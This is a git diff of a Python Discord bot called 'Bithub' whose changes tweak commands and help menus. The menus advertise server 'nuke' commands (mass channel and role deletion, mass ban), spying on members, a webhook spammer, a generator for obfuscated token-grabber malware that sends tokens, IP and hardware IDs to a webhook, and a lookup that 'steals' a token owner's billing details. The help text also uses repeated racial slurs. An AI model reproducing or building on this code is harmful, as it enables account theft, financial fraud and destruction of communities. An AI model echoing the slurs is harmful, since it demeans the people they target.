@@ -8,7 +8,7 @@ import base64
 import marshal
 import string
 from config import TOKEN
-from tokeninfo import tokeninfo
+from utils.tokeninfo import tokeninfo
 from discord.ext import commands
 
 
@@ -52,20 +52,7 @@ bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
 bot.remove_command('help')
 
-def check_token_type(token):
-    headers = {
-        'Authorization': token
-    }
-    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
-    
-    if response.status_code == 200:
-        data = response.json()
-        if 'bot' in data:
-            return 'Bot'
-        else:
-            return 'Account'
-    else:
-        return 'Invalid/Bot'
+
 
 
 
@@ -74,8 +61,8 @@ async def on_ready():
     user = await bot.fetch_user(YOURUSERID)
     await bot.change_presence(status=discord.Status.dnd)
     await user.send("Bot ready. Developed by <@992952207588720730>")
-    game = discord.Game(f"{PREFIX}help")
-    await bot.change_presence(activity=game)
+    activity = discord.Activity(type=discord.ActivityType.listening, name=f"{PREFIX}help")
+    await bot.change_presence(activity=activity)
     print(f'Logged in as {bot.user.name}')
 
 
@@ -104,8 +91,10 @@ async def on_audit_log_entry_create(entry):
         guild = entry.guild
         channel = discord.utils.get(guild.text_channels, name='spy')
 
+        actionxd = str(entry.action).replace("AuditLogAction.", "")
+
         embed = discord.Embed(title='Audit Log Entry Created', color=discord.Color.green())
-        embed.add_field(name='Action', value=str(entry.action), inline=False)
+        embed.add_field(name='Action', value=actionxd, inline=False)
         embed.add_field(name='User', value=str(entry.user), inline=False)
         embed.add_field(name='Target', value=str(entry.target), inline=False)
         embed.add_field(name='Reason', value=str(entry.reason), inline=False)
@@ -461,13 +450,14 @@ async def purge(ctx, server_id):
 
 @bot.command()
 async def help(ctx):
-    help_embed = discord.Embed(title='Bithub [ALPHA] V0.01', color=discord.Color.blue())
+    help_embed = discord.Embed(title='Bithub [ALPHA] V0.01 ❄️', description="⚠️ This bot is new, there may be errors ⚠️", color=discord.Color.blue())
     help_embed.add_field(name='', value='Nuke ☢️', inline=False)
     help_embed.add_field(name='', value='Utility 🛠️', inline=False)
     help_embed.add_field(name='', value='Spy 👁️', inline=False)
     help_embed.add_field(name='', value='Side functions 😈', inline=False)
     help_embed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
     view = XOLOVIEW()
+    view.add_item(discord.ui.Button(label="Github 🐈‍⬛",style=discord.ButtonStyle.link,url="https://github.com/x9o/Bithub"))
     await ctx.reply(embed=help_embed, view=view)
 
 @bot.command()
@@ -662,7 +652,7 @@ async def tokengrabber(ctx, webhook, obfus):
         await ctx.reply("Invalid webhook URL.")
         return
 
-    with open('grabber.py', 'r') as file:
+    with open('utils/grabber.py', 'r') as file:
         content = file.read()
 
     
@@ -684,11 +674,11 @@ async def tokengrabber(ctx, webhook, obfus):
 @bot.command()
 async def tokeninformation(ctx, token):
     
-    info = tokeninfo(token)
-                                                      # 4
     
+    info = tokeninfo(token)
+
     try:
-        embed = discord.Embed(title="Token Information", color=discord.Color.gold())
+        embed = discord.Embed(title="Token Information", description=f"||{token}||", color=discord.Color.gold())
         embed.add_field(name="Username", value=info[1], inline=False)
         embed.add_field(name="User ID", value=info[2], inline=False)
         embed.add_field(name="Phone Number", value=info[4], inline=False)
@@ -700,12 +690,11 @@ async def tokeninformation(ctx, token):
         embed.add_field(name="MFA enabled", value=info[9], inline=False)
         embed.add_field(name="Flags", value=info[10], inline=False)
         embed.add_field(name="Verified", value=info[11], inline=False)
-        embed.set_footer(text="Billing info will also be sent if any.")
+        embed.set_footer(text="Avatar URL | Billing info will be sent if any")
         embed.set_image(url=info[3])
 
+        first_message = await ctx.reply(embed=embed)  
 
-        await ctx.reply(embed=embed)
-        
         billinginfo = None
 
         if info is not None and len(info) >= 14:
@@ -715,16 +704,17 @@ async def tokeninformation(ctx, token):
                 billinginfo = discord.Embed(title="Billing Information", color=discord.Color.gold())
                 for field_name, field_value in data.items():
                     billinginfo.add_field(name=field_name, value=field_value, inline=False)
-                await ctx.reply(embed=billinginfo)
+                await first_message.reply(embed=billinginfo)  
+                
             else:
-                await ctx.reply("No billing information available.")
+                await first_message.reply("No billing information available.")  
+                
         else:
             pass
-        
-        
 
     except Exception as e:
-        await ctx.send(info)
+        await ctx.reply(info)
+        print(e)
     
 #                                  non bot functions                                      #
 
@@ -793,9 +783,8 @@ class XOLOVIEW(discord.ui.View):
         help_embed.add_field(name='Purge', value='Deletes all channels\n`!purge <serverid>`', inline=False)
         help_embed.add_field(name='Mass Ping [Use if the bot does not have admin]', value='`!massping <serverid> <messageamount> <messagecontent>`', inline=False)
         help_embed.add_field(name='Clear Channel', value='Deletes all messages in a channel\n`!clearchannel <serverid> <channelid>`', inline=False)
-        help_embed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
         help_embed.add_field(name='Role Purge (Cannot delete roles above the bot)', value='`!rolepurge <serverid>`', inline=False)
-        help_embed.add_field(name='❌ Mass Ban [PROBABLY BROKEN]', value='`!massban <serverid>`', inline=False)
+        help_embed.add_field(name='🔴 Mass Ban [Will fix soon]', value='`!massban <serverid>`', inline=False)
         help_embed.set_footer(text="Made by xolo")
 
         await interaction.response.send_message(embed=help_embed, ephemeral=True)
@@ -805,22 +794,21 @@ class XOLOVIEW(discord.ui.View):
     async def niga(self, interaction: discord.Interaction, button: discord.ui.Button):
         helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
         helpembed.add_field(name='Leave', value='Leaves the server\n`!leave <serverid>`', inline=False)
-        helpembed.add_field(name='Link', value='Invite link\n`!link`', inline=False)
-        helpembed.add_field(name='Server List', value='`!servlist`', inline=False)
+        helpembed.add_field(name='Link', value='Bot Invite link\n`!link`', inline=False)
+        helpembed.add_field(name='Server List', value='Shows a list of servers the bot is in for you to nuke.\n`!servlist`', inline=False)
         helpembed.add_field(name='Clear', value='Deletes all messages sent by the bot\n`!clear <serverid>`', inline=False)
-        helpembed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
-        helpembed.add_field(name='Token Information', value='`!tokeninformation <token>`', inline=False)
-        helpembed.add_field(name='Say', value='`!say <msg>`', inline=False)
+        helpembed.add_field(name='Set Status', value='Owner only\n`!setstatus <status>`', inline=False)
+        helpembed.add_field(name='Say', value='Says some bullshit you want\n`!say <msg>`', inline=False)
         helpembed.add_field(name='Ban', value='`!ban <userid> <reason>`', inline=False)
         helpembed.add_field(name='UnBan', value='`!unban <userid>`', inline=False)
-        helpembed.add_field(name='DM', value='`!dm <userid> <msgcontent>`', inline=False)
-        helpembed.add_field(name='Avatar', value='`!avatar <user>`', inline=False)
+        helpembed.add_field(name='DM', value='DM a nigga\n`!dm <userid> <msgcontent>`', inline=False)
+        helpembed.add_field(name='Avatar', value='Check the avatar of a nigga\n`!avatar <user>`', inline=False)
         helpembed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
 
         await interaction.response.send_message(embed=helpembed, ephemeral=True)
 
     @discord.ui.button(label="👁️",
-                       style=discord.ButtonStyle.gray)
+                       style=discord.ButtonStyle.secondary)
     async def nigaz(self, interaction: discord.Interaction, button: discord.ui.Button):
         global auditlogspy
         global banspy
@@ -829,12 +817,12 @@ class XOLOVIEW(discord.ui.View):
         global deletespy
         global editspy
         helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
-        helpxembed.add_field(name='Audit log spy [!auditspytoggle]', value=f'Status: {auditlogspy}', inline=False)
-        helpxembed.add_field(name='❌ User profile change spy [BROKEN] [!profilespytoggle] ❌', value=f'Status: {userprofilespy}', inline=False)
-        helpxembed.add_field(name='Ban detector [!banspytoggle]', value=f'Status: {banspy} ', inline=False)
-        helpxembed.add_field(name='Leave detector [!leavespytoggle]', value=f'Status: {leavespy} ', inline=False)
-        helpxembed.add_field(name='Message deletion spy [!deletespytoggle]', value=f'Status: {deletespy} ', inline=False)
-        helpxembed.add_field(name='Message edit spy [!editspytoggle]', value=f'Status: {editspy} ', inline=False)
+        helpxembed.add_field(name='Audit log spy', value=f'[!auditspytoggle <on/off>]\nStatus: {auditlogspy}', inline=False)
+        helpxembed.add_field(name='🔴 User profile change spy [BROKEN]', value=f'[!profilespytoggle <on/off>]\nStatus: {userprofilespy}', inline=False)
+        helpxembed.add_field(name='Ban detector', value=f'[!banspytoggle <on/off>]\nStatus: {banspy} ', inline=False)
+        helpxembed.add_field(name='Leave spy', value=f'[!leavespytoggle <on/off>]\nStatus: {leavespy} ', inline=False)
+        helpxembed.add_field(name='Spy when niggas delete they messages', value=f'[!deletespytoggle]\nStatus: {deletespy} ', inline=False)
+        helpxembed.add_field(name='Spy when niggas edit they messages', value=f'[!editspytoggle]\nStatus: {editspy} ', inline=False)
         helpxembed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
 
 
@@ -845,11 +833,15 @@ class XOLOVIEW(discord.ui.View):
                        style=discord.ButtonStyle.blurple)
     async def nigar(self, interaction: discord.Interaction, button: discord.ui.Button):
         help_embed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
-        help_embed.add_field(name='Webhook Spammer', value='`!webhookspam <webhook> <msgcontent>`', inline=False)
-        help_embed.add_field(name='Token grabber generator', value='`!tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
+        help_embed.add_field(name='Webhook Spammer', value='Spams a webhook until it gets rate limited asf\n`!webhookspam <webhook> <msgcontent>`', inline=False)
+        help_embed.add_field(name='Token grabber generator', value='Generates a token grabber in python. Also grabs IP, HWID, etc.\n`!tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
+        help_embed.add_field(name='Token Information', value='Provides full information on a user token. Billing info will also be stolen, if any.\n`!tokeninformation <token>`', inline=False)
         help_embed.set_footer(text="Made by xolo")
 
         await interaction.response.send_message(embed=help_embed, ephemeral=True)
+
+
+        
 
 
         
